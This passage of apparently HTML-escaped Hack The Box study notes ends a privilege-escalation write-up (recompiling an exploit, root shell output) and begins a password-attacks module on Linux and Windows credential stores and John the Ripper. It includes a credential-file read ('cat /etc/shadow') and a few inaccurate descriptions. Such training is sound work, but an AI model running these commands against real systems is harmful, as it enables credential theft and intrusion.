&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;c0derpwner@htb:/htb-&amp;gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./e

./e: /lib/x86_64-linux-gnu/libc.so.6: version &lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;GLIBC_2.34&lt;span class=&quot;s1&quot;&gt;&apos; not found (required by ./e)
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Now the problem seems about compilation and as you can see it’s using GLIBC 2.34 and the vulnerable version of it is the 2.31 version..&lt;/p&gt;

&lt;p&gt;so buildind a docker with this we can easily recompile in docker itself with this &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Dockerfile&lt;/code&gt;:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;FROM ubuntu:20.04  
  
RUN apt update &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; apt &lt;span class=&quot;nb&quot;&gt;install&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-y&lt;/span&gt; build-essential &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt;  apt &lt;span class=&quot;nb&quot;&gt;install&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-y&lt;/span&gt; git
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;so now compiling with the right libc version make the exploit works&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;./exploit
&lt;span class=&quot;nb&quot;&gt;id  
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;password-attacks&quot;&gt;Password Attacks&lt;/h1&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Confidentiality&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Integrity&lt;/code&gt;, and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Availability&lt;/code&gt; are at the heart of every Infosec practitioner’s role. Without maintaining a balance between them, we cannot ensure the safety and security of our enterprises. We keep this balance by ensuring we audit and account (Accounting) for each file, object, and host in our environment; by validating users have correct permissions (Authorization) to view and utilize those items; and ensuring that each user’s identity is validated (Authentication) before granting them access to any enterprise resources. Most breaches can be tied back to losing one of those three tenets. This module will focus on attacking and bypassing the tenet of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Authentication&lt;/code&gt; by compromising user passwords in many different operating systems, applications, and encryption types. Let’s take a second to discuss authentication and its components in a bit more detail before diving into the exciting part, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;attacking passwords&lt;/code&gt;.
Authentication, at its core, is the validation of your identity by presenting a combination of three main factors to a validation mechanism. They are;&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Something you know (a password, passcode, pin, etc.).&lt;/li&gt;
  &lt;li&gt;Something you have (an ID Card, security key, or other MFA tools).&lt;/li&gt;
  &lt;li&gt;Something you are (your physical self, username, email address, or other identifiers.)&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;The process can require any or all of these authentication descriptors. These methods will be determined based on the severity of the information or systems accessed and how much protection they need. For example, doctors are often required to utilize a Common Access Card (CAC) paired with a pin-code or password to access any terminals that input or store patient data. Depending on the maturity of the organization’s security posture, they could require all three types (A CAC, password, and pin from an authenticator app, for example).&lt;/p&gt;

&lt;p&gt;Another simple example of this is access to our email address. The proof of information, in this case, would be the knowledge of the email address itself and the associated password. For example, a cell phone with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;2FA&lt;/code&gt; can be used. The third aspect can also play a role: the user’s presence through biometric recognition such as a fingerprint or facial recognition.&lt;/p&gt;

&lt;p&gt;In the previous example, the password is the authentication identifier that can be bypassed with different TTPs. This level is about authenticating the identity. Usually, only the owner and authenticating authority know the password. Authorization is carried out if the correct password is given to the authentication authority. Authorization, in this case, is the set of permissions that the user is granted upon successful login.&lt;/p&gt;

&lt;hr /&gt;

&lt;h6 id=&quot;the-use-of-passwords&quot;&gt;The Use of Passwords&lt;/h6&gt;

&lt;p&gt;The most common and widely used authentication method is still the use of passwords, but what is a password? A password or passphrase can be generally defined as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;a combination of letters, numbers, and symbols in a string for identity validation.&lt;/code&gt; For example, if we work with passwords and take a standard 8-digit password that consists only of upper case letters and numbers, we would get a total of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;36⁸&lt;/code&gt; (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;208,827,064,576&lt;/code&gt;) different combinations of passwords.&lt;/p&gt;

&lt;p&gt;Realistically, it doesn’t need to be a combination of those things. It could be a lyric from a song or poem, a line from a book, a phrase you can remember, or even randomly generated words concatenated together like “TreeDogEvilElephant.” The key is for it to meet or exceed the security standards in place by your organization. Using multiple layers to establish identity can make the entire authentication process complicated and costly. Adding complexity to the authentication process creates further effort that can add to the stresses and workload a person may have during a typical workday. Complex systems can often require inconvenient manual processes or additional steps that could significantly complicate the interaction and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;user experience&lt;/code&gt; (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;UX&lt;/code&gt;). Consider the process of shopping at an online store. Creating an account on the store website can make the authentication and checkout processes much faster than manually inputting your personal information each time you wish to make a purchase. For this reason, using a username and password to secure an account is the most widespread method of authentication that we will see again and again while keeping in mind this balance of convenience and security.&lt;/p&gt;

&lt;p&gt;PandaSecurity has compiled &lt;a href=&quot;https://www.pandasecurity.com/en/mediacenter/tips/password-statistics/&quot;&gt;statistics&lt;/a&gt; on various aspects of passwords that give us a good overview of how and in what way passwords are used worldwide. Of interest to us would be the entry describing &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;24% of Americans&lt;/code&gt; have used passwords like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;password&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Qwerty&lt;/code&gt;, or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;123456&lt;/code&gt;. So, in theory, we could successfully compromise systems using these three passwords at many different organizations due to their widespread use.&lt;/p&gt;

&lt;p&gt;One aspect of this statistic that is somewhat more difficult to understand is that only 45% of Americans would change their passwords after a data breach. This, in turn, means that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;55% still keep the password&lt;/code&gt; even though it has already been leaked. We can also check if one of our email addresses is affected by various data breaches. One of the best-known sources for this is &lt;a href=&quot;https://haveibeenpwned.com/&quot;&gt;HaveIBeenPwned&lt;/a&gt;. We enter an email address in the HaveIBeenPwned website, and it checks in its database if the email address has already been affected by any reported data breaches. If this is the case, we will see a list of all of the breaches in which our email address appears.&lt;/p&gt;

&lt;h4 id=&quot;credential-storage&quot;&gt;Credential Storage&lt;/h4&gt;

&lt;h5 id=&quot;linux&quot;&gt;Linux&lt;/h5&gt;

&lt;p&gt;As we already know, Linux-based systems handle everything in the form of a file. Accordingly, passwords are also stored encrypted in a file. This file is called the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;shadow&lt;/code&gt; file and is located in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/shadow&lt;/code&gt; and is part of the Linux user management system. In addition, these passwords are commonly stored in the form of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;hashes&lt;/code&gt;. An example can look like this:&lt;/p&gt;

&lt;p&gt;Credential Storage&lt;/p&gt;

&lt;div class=&quot;language-shell-session highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;root@htb:~#&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /etc/shadow
&lt;span class=&quot;go&quot;&gt;
...SNIP...
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;htb-student:$&lt;/span&gt;y&lt;span class=&quot;nv&quot;&gt;$j9T$3QSBB6CbHEu&lt;/span&gt;...SNIP...f8Ms:18955:0:99999:7:::
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/shadow&lt;/code&gt; file has a unique format in which the entries are entered and saved when new users are created.&lt;/p&gt;

&lt;p&gt;| &lt;strong&gt;ID&lt;/strong&gt;   | &lt;strong&gt;Cryptographic Hash Algorithm&lt;/strong&gt;                                      |
| ——– | ——————————————————————— |
| &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$1$&lt;/code&gt;    | &lt;a href=&quot;https://en.wikipedia.org/wiki/MD5&quot;&gt;MD5&lt;/a&gt;                              |
| &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$2a$&lt;/code&gt;   | &lt;a href=&quot;https://en.wikipedia.org/wiki/Blowfish_\(cipher\)&quot;&gt;Blowfish&lt;/a&gt;         |
| &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$5$&lt;/code&gt;    | &lt;a href=&quot;https://en.wikipedia.org/wiki/SHA-2&quot;&gt;SHA-256&lt;/a&gt;                        |
| &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$6$&lt;/code&gt;    | &lt;a href=&quot;https://en.wikipedia.org/wiki/SHA-2&quot;&gt;SHA-512&lt;/a&gt;                        |
| &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$sha1$&lt;/code&gt; | &lt;a href=&quot;https://en.wikipedia.org/wiki/SHA-1&quot;&gt;SHA1crypt&lt;/a&gt;                      |
| &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$y$&lt;/code&gt;    | &lt;a href=&quot;https://github.com/openwall/yescrypt&quot;&gt;Yescrypt&lt;/a&gt;                      |
| &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$gy$&lt;/code&gt;   | &lt;a href=&quot;https://www.openwall.com/lists/yescrypt/2019/06/30/1&quot;&gt;Gost-yescrypt&lt;/a&gt; |
| &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$7$&lt;/code&gt;    | &lt;a href=&quot;https://en.wikipedia.org/wiki/Scrypt&quot;&gt;Scrypt&lt;/a&gt;                        |
However, a few more files belong to the user management system of Linux. The other two files are &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/passwd&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/group&lt;/code&gt;. In the past, the encrypted password was stored together with the username in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/passwd&lt;/code&gt; file, but this was increasingly recognized as a security problem because the file can be viewed by all users on the system and must be readable. The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/shadow&lt;/code&gt; file can only be read by the user &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt;.&lt;/p&gt;

&lt;h4 id=&quot;windows-authentication-process&quot;&gt;Windows Authentication Process&lt;/h4&gt;

&lt;p&gt;The &lt;a href=&quot;https://docs.microsoft.com/en-us/windows-server/security/windows-authentication/credentials-processes-in-windows-authentication&quot;&gt;Windows client authentication process&lt;/a&gt; can oftentimes be more complicated than with Linux systems and consists of many different modules that perform the entire logon, retrieval, and verification processes. In addition, there are many different and complex authentication procedures on the Windows system, such as Kerberos authentication. The &lt;a href=&quot;https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection&quot;&gt;Local Security Authority&lt;/a&gt; (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;LSA&lt;/code&gt;) is a protected subsystem that authenticates users and logs them into the local computer. In addition, the LSA maintains information about all aspects of local security on a computer. It also provides various services for translating between names and security IDs (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SIDs&lt;/code&gt;).&lt;/p&gt;

&lt;p&gt;The security subsystem keeps track of the security policies and accounts that reside on a computer system. In the case of a Domain Controller, these policies and accounts apply to the domain where the Domain Controller is located. These policies and accounts are stored in Active Directory. In addition, the LSA subsystem provides services for checking access to objects, checking user permissions, and generating monitoring messages.&lt;/p&gt;

&lt;h6 id=&quot;windows-authentication-process-diagram&quot;&gt;Windows Authentication Process Diagram&lt;/h6&gt;

&lt;p&gt;&lt;img src=&quot;https://academy.hackthebox.com/storage/modules/147/Auth_process1.png&quot; alt=&quot;Diagram of Windows Authentication Process showing interactions between WinLogon.exe, LogonUI, lsass.exe, and authentication packages like NTLM and Kerberos.&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Local interactive logon is performed by the interaction between the logon process (&lt;a href=&quot;https://www.microsoftpressstore.com/articles/article.aspx?p=2228450&amp;amp;seqNum=8&quot;&gt;WinLogon&lt;/a&gt;), the logon user interface process (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;LogonUI&lt;/code&gt;), the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;credential providers&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;LSASS&lt;/code&gt;, one or more &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;authentication packages&lt;/code&gt;, and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SAM&lt;/code&gt; or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Active Directory&lt;/code&gt;. Authentication packages, in this case, are the Dynamic-Link Libraries (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DLLs&lt;/code&gt;) that perform authentication checks. For example, for non-domain joined and interactive logins, the authentication package &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Msv1_0.dll&lt;/code&gt; is used.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Winlogon&lt;/code&gt; is a trusted process responsible for managing security-related user interactions. These include:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;Launching LogonUI to enter passwords at login&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Changing passwords&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Locking and unlocking the workstation&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;It relies on credential providers installed on the system to obtain a user’s account name or password. Credential providers are &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;COM&lt;/code&gt; objects that are located in DLLs.&lt;/p&gt;

&lt;p&gt;Winlogon is the only process that intercepts login requests from the keyboard sent via an RPC message from Win32k.sys. Winlogon immediately launches the LogonUI application at logon to display the user interface for logon. After Winlogon obtains a user name and password from the credential providers, it calls LSASS to authenticate the user attempting to log in.&lt;/p&gt;

&lt;h6 id=&quot;lsass&quot;&gt;LSASS&lt;/h6&gt;

&lt;p&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service&quot;&gt;Local Security Authority Subsystem Service&lt;/a&gt; (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;LSASS&lt;/code&gt;) is a collection of many modules and has access to all authentication processes that can be found in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;%SystemRoot%\System32\Lsass.exe&lt;/code&gt;. This service is responsible for the local system security policy, user authentication, and sending security audit logs to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Event log&lt;/code&gt;. In other words, it is the vault for Windows-based operating systems, and we can find a more detailed illustration of the LSASS architecture &lt;a href=&quot;https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-2000-server/cc961760\(v=technet.10\)?redirectedfrom=MSDN&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;&lt;strong&gt;Authentication Packages&lt;/strong&gt;&lt;/th&gt;
      &lt;th&gt;&lt;strong&gt;Description&lt;/strong&gt;&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Lsasrv.dll&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;The LSA Server service both enforces security policies and acts as the security package manager for the LSA. The LSA contains the Negotiate function, which selects either the NTLM or Kerberos protocol after determining which protocol is to be successful.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Msv1_0.dll&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Authentication package for local machine logons that don’t require custom authentication.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Samsrv.dll&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;The Security Accounts Manager (SAM) stores local security accounts, enforces locally stored policies, and supports APIs.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Kerberos.dll&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Security package loaded by the LSA for Kerberos-based authentication on a machine.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Netlogon.dll&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Network-based logon service.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Ntdsa.dll&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;This library is used to create new records and folders in the Windows registry.&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Source: &lt;a href=&quot;https://docs.microsoft.com/en-us/windows-server/security/windows-authentication/credentials-processes-in-windows-authentication&quot;&gt;Microsoft Docs&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Each interactive logon session creates a separate instance of the Winlogon service. The &lt;a href=&quot;https://docs.microsoft.com/en-us/windows/win32/secauthn/gina&quot;&gt;Graphical Identification and Authentication&lt;/a&gt; (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GINA&lt;/code&gt;) architecture is loaded into the process area used by Winlogon, receives and processes the credentials, and invokes the authentication interfaces via the &lt;a href=&quot;https://docs.microsoft.com/en-us/windows/win32/api/ntsecapi/nf-ntsecapi-lsalogonuser&quot;&gt;LSALogonUser&lt;/a&gt; function.&lt;/p&gt;

&lt;h6 id=&quot;sam-database&quot;&gt;SAM Database&lt;/h6&gt;

&lt;p&gt;The &lt;a href=&quot;https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc756748\(v=ws.10\)?redirectedfrom=MSDN&quot;&gt;Security Account Manager&lt;/a&gt; (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SAM&lt;/code&gt;) is a database file in Windows operating systems that stores users’ passwords. It can be used to authenticate local and remote users. SAM uses cryptographic measures to prevent unauthenticated users from accessing the system. User passwords are stored in a hash format in a registry structure as either an &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;LM&lt;/code&gt; hash or an &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NTLM&lt;/code&gt; hash. This file is located in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;%SystemRoot%/system32/config/SAM&lt;/code&gt; and is mounted on HKLM/SAM. SYSTEM level permissions are required to view it.&lt;/p&gt;

&lt;p&gt;Windows systems can be assigned to either a workgroup or domain during setup. If the system has been assigned to a workgroup, it handles the SAM database locally and stores all existing users locally in this database. However, if the system has been joined to a domain, the Domain Controller (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DC&lt;/code&gt;) must validate the credentials from the Active Directory database (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ntds.dit&lt;/code&gt;), which is stored in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;%SystemRoot%\ntds.dit&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Microsoft introduced a security feature in Windows NT 4.0 to help improve the security of the SAM database against offline software cracking. This is the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SYSKEY&lt;/code&gt; (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;syskey.exe&lt;/code&gt;) feature, which, when enabled, partially encrypts the hard disk copy of the SAM file so that the password hash values for all local accounts stored in the SAM are encrypted with a key.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://academy.hackthebox.com/storage/modules/147/authn_credman_credprov.png&quot; alt=&quot;Diagram of Windows logon process showing interactions between user input, Logon UI, Credential Provider, Winlogon, and Local Security Authority.&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Source: &lt;a href=&quot;https://docs.microsoft.com/en-us/windows-server/security/windows-authentication/credentials-processes-in-windows-authentication&quot;&gt;Microsoft Docs&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Credential Manager is a feature built-in to all Windows operating systems that allows users to save the credentials they use to access various network resources and websites. Saved credentials are stored based on user profiles in each user’s &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Credential Locker&lt;/code&gt;. Credentials are encrypted and stored at the following location:&lt;/p&gt;

&lt;p&gt;Credential Storage&lt;/p&gt;

&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;PS&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;C:\Users\&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Username&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;\AppData\Local\Microsoft\&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Vault/Credentials&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h5 id=&quot;ntds&quot;&gt;NTDS&lt;/h5&gt;

&lt;p&gt;It is very common to come across network environments where Windows systems are joined to a Windows domain. This is common because it makes it easier for admins to manage all the systems owned by their respective organizations (centralized management). In these cases, the Windows systems will send all logon requests to Domain Controllers that belong to the same Active Directory forest. Each Domain Controller hosts a file called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NTDS.dit&lt;/code&gt; that is kept synchronized across all Domain Controllers with the exception of &lt;a href=&quot;https://docs.microsoft.com/en-us/windows/win32/ad/rodc-and-active-directory-schema&quot;&gt;Read-Only Domain Controllers&lt;/a&gt;. NTDS.dit is a database file that stores the data in Active Directory, including but not limited to:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;User accounts (username &amp;amp; password hash)&lt;/li&gt;
  &lt;li&gt;Group accounts&lt;/li&gt;
  &lt;li&gt;Computer accounts&lt;/li&gt;
  &lt;li&gt;Group policy objects&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;We will practice methods that allow us to extract credentials from the NTDS.dit file later in this module.&lt;/p&gt;

&lt;p&gt;Now that we have gone through a primer on credential storage concepts, let’s study the various attacks we can perform to extract credentials to further our access during assessments.&lt;/p&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;john-the-ripper&quot;&gt;John The Ripper&lt;/h2&gt;

&lt;p&gt;&lt;a href=&quot;https://github.com/openwall/john&quot;&gt;John the Ripper&lt;/a&gt; (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;JTR&lt;/code&gt; or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;john&lt;/code&gt;) is an essential pentesting tool used to check the strength of passwords and crack encrypted (or hashed) passwords using either brute force or dictionary attacks.&lt;/p&gt;

&lt;p&gt;It is open-source software initially developed for UNIX-based systems and first released in 1996. It has become a staple of security professionals due to its various capabilities.&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;&lt;strong&gt;Encryption Technology&lt;/strong&gt;&lt;/th&gt;
      &lt;th&gt;&lt;strong&gt;Description&lt;/strong&gt;&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;UNIX crypt(3)&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Crypt(3) is a traditional UNIX encryption system with a 56-bit key.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Traditional DES-based&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;DES-based encryption uses the Data Encryption Standard algorithm to encrypt data.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bigcrypt&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Bigcrypt is an extension of traditional DES-based encryption. It uses a 128-bit key.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;BSDI extended DES-based&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;BSDI extended DES-based encryption is an extension of the traditional DES-based encryption and uses a 168-bit key.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FreeBSD MD5-based&lt;/code&gt; (Linux &amp;amp; Cisco)&lt;/td&gt;
      &lt;td&gt;FreeBSD MD5-based encryption uses the MD5 algorithm to encrypt data with a 128-bit key.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;OpenBSD Blowfish-based&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;OpenBSD Blowfish-based encryption uses the Blowfish algorithm to encrypt data with a 448-bit key.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Kerberos/AFS&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Kerberos and AFS are authentication systems that use encryption to ensure secure entity communication.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Windows LM&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Windows LM encryption uses the Data Encryption Standard algorithm to encrypt data with a 56-bit key.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DES-based tripcodes&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;DES-based tripcodes are used to authenticate users based on the Data Encryption Standard algorithm.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SHA-crypt hashes&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;SHA-crypt hashes are used to encrypt data with a 256-bit key and are available in newer versions of Fedora and Ubuntu.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SHA-crypt&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SUNMD5 hashes&lt;/code&gt; (Solaris)&lt;/td&gt;
